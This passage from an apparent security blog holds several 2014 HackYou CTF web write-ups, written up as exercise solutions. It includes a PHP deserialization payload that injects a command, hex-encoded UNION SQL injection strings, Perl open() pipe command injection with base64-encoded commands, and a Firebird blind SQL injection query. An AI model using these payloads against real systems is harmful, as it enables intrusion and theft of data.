<p>Also, if we want to obtain our exploit "image" hash to craft the PHPSESSIONID, we need our exploit to have "$this-&gt;type &gt; 0" and for that we need <strong>exif_imagetype()</strong> to return a value bigger than 0. So our exploit will be generated with the following script that will run "ls /" when the Upload instance is destroyed. PHP 5 introduced a destructor concept similar to that of other object-oriented languages, such as C++. The destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>

<pre><code class="language-lang-php line-numbers ">class Upload {  
    function __construct($path) {
        $this-&gt;data = "";
        $this-&gt;filename = "";
        $this-&gt;path = $path;
        $this-&gt;type = "image/jpeg";
    }
}

function encrypt($data) {  
        $size = 32;
        $key = '6hQJMFh8gRje67EmpDX3';
        $iv = mcrypt_create_iv($size, MCRYPT_RAND);
        $key = hash('sha256', $key, true);
        $data = $iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
        return $data;
}

$upload = new Upload("img; ls /");
$payload = 'auth|'.serialize($upload);
$data = '';
$file = 0;
while (true){  
    echo '.';
    $data = encrypt($payload);
    file_put_contents("exploit",$data);
    $file = exif_imagetype('exploit');
    if($file &gt; 0){
        echo $file."\n";
        die("Done\n");
    };
};
</code></pre>

<p>Now our exploit will be accepted:</p>

<p><img src="../../content/images/octopress/web400-3.png" alt=""></p>

<p>All we are left to do is use our SSRF vector to visit the admin.php page for us and make it set the PHPSESSIONID in the query parameter:</p>

<p><img src="../../content/images/octopress/web400-4.png" alt=""></p>

<p>If we decode the response:</p>

<p><img src="../../content/images/octopress/web400-5.png" alt=""></p>

<p>The flag was:</p>

<pre><code class="language-lang-bash line-numbers ">CTF{42a38432d46b9054004a7a87fd3140c7}  
</code></pre>
    </section>
</article>


<article class="post tag-ctf tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../ctf/">CTF</a>, <a href="index.html">PHP</a>, <a href="../hackyou201458/">HackYou2014</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/16/hackyou2014-web100-write-up/">#hackyou2014 Web100 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:10080/">level</a> we are presented with some logos we can vote.</p>

<p><img src="../../content/images/octopress/web100-1.png" alt=""></p>

<p>If we look at the source code we can see an interesting comment:</p>

<pre><code class="language-lang-html line-numbers ">...
&lt;!-- TODO: remove index.phps --&gt;  
...
</code></pre>

<p>We can grab the source code:</p>

<pre><code class="language-lang-php line-numbers "> &lt;?php
include 'db.php';  
session_start();  
if (!isset($_SESSION['login'])) {  
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
}
$login = $_SESSION['login'];

if (isset($_POST['submit'])) {  
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
        die('Hacking attempt!');
    $id = $_POST['id'];
    $vote = (int)$_POST['vote'];
    if ($vote &gt; 5 || $vote &lt; 1)
        $vote = 1;
    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
    echo '&lt;table border="1"&gt;';
    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
    while ($r = mysql_fetch_array($q)) {
        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
    }
    echo '&lt;/table&gt;';
    echo '&lt;br&gt;&lt;a href="index.php"&gt;Back&lt;/a&gt;&lt;br&gt;';
    exit;
}
&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Picture Gallery&lt;/title&gt;
&lt;/head&gt;  
&lt;body&gt;  
&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;  
&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;  
&lt;form action="index.php" method="POST"&gt;  
&lt;table border="1" cellspacing="5"&gt;  
&lt;tr&gt;  
$q = mysql_query('SELECT * FROM picture');
while ($r = mysql_fetch_array($q)) {  
    echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';
}
&lt;/tr&gt;  
&lt;/table&gt;  
&lt;p&gt;Your vote:  
&lt;select name="vote"&gt;  
&lt;option value="1"&gt;1&lt;/option&gt;  
&lt;option value="2"&gt;2&lt;/option&gt;  
&lt;option value="3"&gt;3&lt;/option&gt;  
&lt;option value="4"&gt;4&lt;/option&gt;  
&lt;option value="5"&gt;5&lt;/option&gt;  
&lt;/select&gt;&lt;/p&gt;  
&lt;input type="submit" name="submit" value="Submit"&gt;  
&lt;/form&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
&lt;!-- TODO: remove index.phps --&gt;  
</code></pre>

<p>We cannot inject in <strong>vote</strong> because it is casted to an integer and the value is verified but we can inject in <strong>id</strong> if we can bypass the <strong>is_numeric</strong> function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how <strong>mysql</strong> handles <a href="http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html">hex literals</a>. <br>
We can verify the injection submiting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729  
999999999999 union all (select 'Hello!!')  
</code></pre>

<p>The server will return:</p>

<p><img src="../../content/images/octopress/web100-2.png" alt=""></p>

<p>Ok, now we can try something more interesting:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129  
999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">information_schema,mysql,performance_schema,task,test  
</code></pre>

<p>From "task"</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729  
999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">Flag,picture,vote  
</code></pre>

<p>Now the columns:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729  
999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')  
</code></pre>

<pre><code class="language-lang-html line-numbers ">flag  
</code></pre>

<p>And finally:</p>

<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729  
999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)  
</code></pre>

<pre><code class="language-lang-html line-numbers ">CTF{820178c33c03aaa7cfe644c691679cf8}  
</code></pre>
    </section>
</article>


<article class="post tag-ctf tag-web tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-15">15 Jan 2014</time> on <a href="../ctf/">CTF</a>, <a href="../web/">Web</a>, <a href="index.html">PHP</a>, <a href="../hackyou201458/">HackYou2014</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/15/hackyou2014-web200-write-up/">#hackyou2014 Web200 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou2014tasks.ctf.su:20080/">level</a> we are presented with a typical Snake game.</p>

<p><img src="../../content/images/octopress/snake.png" alt=""></p>

<p>I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the <strong>X-Forwarded-For</strong> header. <br>
That was pretty much it until the CTF was about to finish when I was given the hint: "../". I could use it to locate a LFI vulnerability that was affecting the <strong>index.php?ip</strong> parameter so I was capable of reading <strong>index.pl</strong>:</p>

<p><img src="../../content/images/octopress/indexpl.png" alt=""></p>

<p>Reviewing the code we spot the LFI in line 4:</p>

<pre><code class="language-lang-bash line-numbers ">$login = $session-&gt;param('login');
print $req-&gt;p('Hello, '.$login.'!');  
if ($req-&gt;param('ip')) {  
    $file = './data/'.MD5($login)."/".$req-&gt;param('ip');
    if (-e $file) {
        open FILE, $file;
        $html = '';
        while (&lt;FILE&gt;) {
            $html .= $_;
        }
        close(FILE);
        print $req-&gt;start_table({border=&gt;1});
        print $req-&gt;Tr($req-&gt;th(['Date', 'Score']));
        print $html;
        print $req-&gt;end_table();
        print $req-&gt;a({href=&gt;'index.pl'}, 'Back');
    } else {
        print $req-&gt;h1('Error');
    }
}
</code></pre>

<p>But also there is another interesting "feature" if $file exists then it will be opened and since perl <strong>open()</strong> command in line 6 allow us to inject commands using pipes, we can execute any arbitrary command. Problem is that $file needs to exist so how can we create a random file there? Well, we can use our ability to submit random IPs with <strong>X-Forwarded-For</strong>:</p>

<p><img src="../../content/images/octopress/web200-1.png" alt=""></p>

<p>Now if we go to index.pl?ip=|pwd| we will get:</p>

<p><img src="../../content/images/octopress/web200-2.png" alt=""></p>

<p>Nice! However we cannot create files containing a slash ("/"):</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|pwd|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls .|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls ..|")'  
fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|ls /|")'  
fusion@fusion:~/test$ ls  
|ls ..|  |ls .|  |pwd|
</code></pre>

<p>No backslashes neither:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo -e '\x6c\x73\x20\x2f'`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Lets try base64:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~/test$ perl -e 'open(FILE, "&gt;&gt;", "./"."|`echo bHMgLw== | base64 -d`|")'  
fusion@fusion:~/test$ ls  
|`echo -e x6cx73x20x2f`|  |`echo bHMgLw== | base64 -d`|  |ls ..|  |ls .|  |pwd|
</code></pre>

<p>Cool! lets submit it:</p>

<p><img src="../../content/images/octopress/web200-3.png" alt=""></p>

<p>And fetch our recompense:</p>

<p><img src="../../content/images/octopress/web200-4.png" alt=""></p>
    </section>
</article>


<article class="post tag-ctf tag-web tag-php tag-hackyou201458">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-15">15 Jan 2014</time> on <a href="../ctf/">CTF</a>, <a href="../web/">Web</a>, <a href="index.html">PHP</a>, <a href="../hackyou201458/">HackYou2014</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/15/hackyou2014-web300-write-up/">#hackyou2014 Web300 write-up</a></h2>

    </header>
    <section class="post-content">
        <p>In this <a href="index.html">level</a> we were presented with an online shop:</p>

<p><img src="../../content/images/octopress/web300-1.png" alt=""></p>

<p>The task name was "AngryBird" and this was very relevant to solve the challange! It actually comes down to two parts:</p>

<ul>
<li>Finding a hidden admin area</li>
<li>Exploiting a blind SQLi to get credentials</li>
</ul>

<h2 id="findingthehiddenadminarea">Finding the hidden admin area</h2>

<p>We were given the following description:</p>

<blockquote>
  <p>Some web-developers still host their sites on Windows platform, and think that it is secure enough</p>
</blockquote>

<p>So we have to unravel our Windows PHP trickery and one of the coolest thigs Ive seen lately is this <a href="http://onsec.ru/onsec.whitepaper-02.eng.pdf">Windows+PHP bug realted with <strong>findfirstfile</strong></a>. If you havent read the paper so far, go and read it, is awesome!.</p>

<p>Anyway, using this trick on the main page and a little bit of burp intruder, we can find interesting hidden stuff. For examplo:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=p&lt;&lt;  
</code></pre>

<p>the "p&lt;&lt;" bit will become "p*" and Windows's findfirstfile API used by include_once will return us the first file starting with "p" and it will show us <strong>phpinfo()</strong></p>

<p><img src="../../content/images/octopress/phpinfo.png" alt=""></p>

<p>Using same trick we can see that "0&lt;&lt;" returns an expty page instead of a "Page does not exists", so it can be the beggining of a directory name. After bruteforcing it we find a secret admin login in</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/0a5d2eb35b90e338ed481893af7a6d78/index.php  
</code></pre>

<p>Now we need the credentials.</p>

<h2 id="exploitingtheangrybird">Exploiting the Angry Bird</h2>

<p>Its easy to find that the order parameter is vulnerable to SQL injection:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost  
</code></pre>

<p>We cannot actually uses single quotes or many other characters because of the WAF, but we can easily prove it with the following URLs:</p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost ASC  
</code></pre>

<p><img src="../../content/images/octopress/web300-2.png" alt=""></p>

<pre><code class="language-lang-bash line-numbers ">http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&amp;order=cost DESC  
</code></pre>

<p><img src="../../content/images/octopress/web300-3.png" alt=""></p>

<p>We can use a similar approach to the one explained <a href="http://www.tuxz.net/blog/archives/2010/11/21/sql_injection__exploiting_the_order_by_clause/">here</a> but if we try similar queries we get errors. <br>
So the DB backend doesnt look like MySQL nor MSSQLServer ... but what the hell can be. Well, actually the task name was quite inspiring: Firebird.</p>

<p>After setting up a local instance and learning the basics of firebird syntax and how the WAF works (substring is not allowed), we come with some valid queries like:</p>

<pre><code class="language-lang-bash line-numbers ">(case when (select ascii_val(reverse(left(list(rdb$relation_name),{1}))) from rdb$relations) = 82 then name end)
</code></pre>

<p>Using a basic python script we brute force it and find the following user tables: USERS and ITEMS</p>

<p>Using similar script we can extract all the users and passwords and so we get: admin/9shS3FAk <br>
If we try those credentials in the admin page, we get the flag:</p>

<blockquote>
  <p>CTF{7aac9050378b1c41e4ba5ce48a2f6642}</p>
</blockquote>
    </section>
</article>


<nav class="pagination" role="navigation">
    <span class="page-number">Page 1 of 1</span>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

